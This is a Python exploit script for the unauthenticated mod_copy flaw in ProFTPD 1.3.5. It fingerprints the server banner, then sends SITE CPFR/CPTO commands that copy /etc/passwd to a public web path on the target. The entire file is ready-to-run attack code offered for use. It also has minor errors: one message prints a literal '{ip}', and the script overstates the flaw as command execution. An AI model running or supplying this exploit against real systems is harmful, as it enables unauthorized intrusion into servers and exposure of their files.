#!/usr/bin/env python3
import socket
import sys
import time

# Target information
target_ip = sys.argv[1]  # Get IP from command line
target_port = 21

# Banner grabbing function
def grab_banner(ip, port):
    try:
        s = socket.socket()
        s.connect((ip, port))
        s.settimeout(5)
        banner = s.recv(1024)
        s.close()
        return banner
    except:
        return b"Could not grab banner"

# Check if server is running ProFTPD 1.3.5
def check_proftpd_version(banner):
    if b"ProFTPD 1.3.5" in banner:
        print("[+] Target is running ProFTPD 1.3.5 (Vulnerable to mod_copy)")
        return True
    else:
        print("[-] Target doesn't appear to be running ProFTPD 1.3.5")
        return False

# Exploit the mod_copy vulnerability
def exploit_mod_copy(ip, port):
    try:
        # Connect to FTP server
        s = socket.socket()
        s.connect((ip, port))
        s.recv(1024)  # Receive welcome banner
        
        print("[*] Connected to FTP server")
        
        # Using mod_copy SITE CPFR/CPTO commands (no authentication needed)
        # This tries to copy /etc/passwd to a web-accessible location
        s.send(b"SITE CPFR /etc/passwd\r\n")
        resp = s.recv(1024)
        print(f"[*] SITE CPFR Response: {resp}")
        
        if b"350" in resp:
            # File exists and we have permission to access it
            s.send(b"SITE CPTO /var/www/html/passwd.txt\r\n")
            resp = s.recv(1024)
            print(f"[*] SITE CPTO Response: {resp}")
            
            if b"250" in resp:
                print("[+] Exploit successful! File copied to /var/www/html/passwd.txt")
                print("[+] Try accessing http://{ip}/passwd.txt to verify")
                return True
        
        print("[-] Exploit failed")
        return False
    
    except Exception as e:
        print(f"Error: {e}")
        return False

# Main function
def main(ip, port):
    print(f"[*] Targeting FTP server at {ip}:{port}")
    
    # Get banner
    banner = grab_banner(ip, port)
    print(f"[*] Banner: {banner}")
    
    # Check ProFTPD version
    if check_proftpd_version(banner):
        print("[*] Attempting to exploit mod_copy vulnerability...")
        result = exploit_mod_copy(ip, port)
        
        if result:
            print("[+] Vulnerability confirmed: ProFTPD 1.3.5 mod_copy command execution")
            print("[+] This allows file operations without authentication!")
            return True
    
    return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target_ip>")
        sys.exit(1)
    
    main(target_ip, target_port)